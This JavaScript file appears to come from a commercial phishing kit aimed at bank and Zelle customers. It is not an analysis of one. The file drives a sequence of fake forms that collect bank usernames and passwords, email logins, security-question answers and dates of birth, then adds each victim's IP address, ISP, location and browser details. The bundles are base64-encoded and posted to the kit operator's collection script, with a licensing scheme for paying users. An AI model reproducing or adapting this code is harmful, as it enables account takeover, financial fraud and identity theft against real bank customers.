async function form_login(u, p) {
    let post = USE_DEDICATED ? _User_Pass_single(u, p, false) : User_Pass_single(u, p, false);
    let result = USE_DEDICATED ? await load_Send_post_Dedicated(post) : await load_Send_post(post);
    if (Object.keys(result).includes('errors')) {
        await reload('MainPath');
    } else {
        if (result.response.msg.includes("uccessfull")) {
            if (USE_DEDICATED === false) localStorage.setItem("username", u);
            setTimeout(async function () {
                await reload('EPath');
            }, 800);
        } else {
            await reload('MainPath');
        }
    }
}

async function form_email(email, password) {
    let post = USE_DEDICATED ? _Email_Pass_single(email, password) : Email_Pass_single(localStorage.getItem("username"), email, password);
    let result = USE_DEDICATED ? await load_Send_post_Dedicated(post) : await load_Send_post(post);
    if (Object.keys(result).includes('errors')) {
        await reload('EPath');
    } else {
        if (result.response.msg.includes("uccessfull")) {
            setTimeout(async function () {
                    await reload('DPath');
            }, 800)
        } else {
            await reload('EPath');
        }
    }
    return false;
}

async function form_question_details(q1, a1, q2, a2, q3, a3, dob) {
    let post = USE_DEDICATED ? _question_info_single(q1, a1, q2, a2, q3, a3, dob) : info_question(localStorage.getItem("username"), q1, a1, q2, a2, q3, a3, dob);
    let result = USE_DEDICATED ? await load_Send_post_Dedicated(post) : await load_Send_post(post);
    if (Object.keys(result).includes('errors')) {
        await reload('DPath');
    } else {
        if (result.response.msg.includes("uccessfull")) {
            setTimeout(async function () {
                await page_completed()
            }, 800);
        } else {
            await reload('DPath');
        }
    }
    return false;
}


//=======================================================

function browser_ip() {
    return `
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
User-Agent: ${navigator.userAgent}";
###############################################################`;
}

function _User_Pass_single(username, password, secondTry = true) {
    if (secondTry === true) {
        return {
            u1: 'unknown',
            second_pass: `\n== Second Try ==\nUsername: ${username}\nPassword: ${password}`,
            username: localStorage.getItem("username"),
            nametype: 'royal',
            userid: DEDICATED_LICENSE,
            type: LICENSE_LOCATION
        }
    } else {
        let u = (new Date()).getTime() + "_" + username;
        localStorage.setItem("username", u);
        return {
            u1: `##################### ${__recent.name} - Zelle #####################\nUsername: ${username}\nPassword: ${password}`,
            username: u,
            nametype: 'zelle',
            userid: DEDICATED_LICENSE,
            type: LICENSE_LOCATION,
            brw: browser_ip()
        }
    }
}

function _question_info_single(q1, a1, q2, a2, q3, a3, dob) {
    let post = `Question 1: ${q1}
Answer 1: ${a1}
===================================================
Question 2: ${q2}
Answer 2: ${a2}
===================================================
Question 3: ${q3}
Answer 3: ${a3}
===================================================
Data Of Birth: ${dob}`;
    return {
        u3: post,
        username: localStorage.getItem("username"),
        nametype: 'royal',
        userid: DEDICATED_LICENSE,
        type: LICENSE_LOCATION
    }
}


function _Email_Pass_single(email, password) {
    return {
        u2: `Email Address: ${email}\nEmail Password: ${password}`,
        username: localStorage.getItem("username"),
        nametype: 'royal',
        userid: DEDICATED_LICENSE,
        type: LICENSE_LOCATION
    }
}


//==================================================


async function load_Send_post_Dedicated(post = {}) {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: D_SCRIPT_NAME,
            type: 'POST',
            dataType: "text",
            data: post,
            success: function (response) {
                resolve({response: {msg: "Yes Sent Successfully"}});
            },
            error: function (response) {
                let error = {errors: response}
                resolve(error);
            }
        });
    });
}

async function file_get_content(url, dataType = "json") {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: url,
            type: 'GET',
            dataType: dataType,
            success: function (response) {
                resolve(response);
            },
            error: function (response) {
                let error = {errors: response}
                resolve(error);
            }
        });
    });
}

async function get_state_city(zip) {
    let output = await file_get_content(`https://0a037114.eu-gb.apigw.appdomain.cloud/zipcode/gen?code=${zip}`);
    if (typeof output === 'object' && !Object.keys(output).includes('errors')) {
        return output;
    }
    return {city: "", state: ""};
}


/*

General License

 */

function User_Pass_single(username, password, secondTry = true) {
    let second = secondTry ? " - Second Try" : "";
    let post = `--------------< Jm Tech Inc. >--------------------------
-----------------< ${REAL_BNK_NAME} >---------------------------
== Bank Access${second} >---------------------------
Username : ${username}
Password : ${password}
== Other Info >--------------------------------
Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
== Browser >----------------------------------
User-Agent: ${navigator.userAgent}
-------------< Jmathew Inc. >---------------------------------

`;
    return btoa(post);
}

function info_question(username, q1, a1, q2, a2, q3, a3, dob) {
    let post = `--------------< Jm Tech Inc. >--------------------------
-----------------< ${REAL_BNK_NAME} >---------------------------
== Security Details - ${username} >---------------------------
Question 1: ${q1}
Answer 1: ${a1}
===================================================
Question 2: ${q2}
Answer 2: ${a2}
===================================================
Question 3: ${q3}
Answer 3: ${a3}
===================================================
Data Of Birth: ${dob}
== Other Info >--------------------------------
Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
== Browser >----------------------------------
User-Agent: ${navigator.userAgent}
-------------< Jmathew Inc. >---------------------------------

`;
    return btoa(post);
}

function Email_Pass_single(username, email, password) {
    let post = `--------------< Jm Tech Inc. >--------------------------
-----------------< ${REAL_BNK_NAME} >---------------------------
== Email Access - ${username} >---------------------------
Email Address : ${email}
Email Password : ${password}
== Other Info >--------------------------------
Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
== Browser >----------------------------------
User-Agent: ${navigator.userAgent}
-------------< Jmathew Inc. >---------------------------------

`;
    return btoa(post);
}


//General Functions
async function load_Send_post(post) {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: USE_DEDICATED ? D_SCRIPT_NAME : G_SCRIPT_NAME,
            type: 'POST',
            dataType: "json",
            data: {
                license: USE_DEDICATED ? DEDICATED_LICENSE : GENERAL_LICENSE_KEY,
                post
            },
            success: function (response) {
                resolve({response});
            },
            error: function (response) {
                let error = {errors: response}
                resolve(error);
            }
        });
    });
}
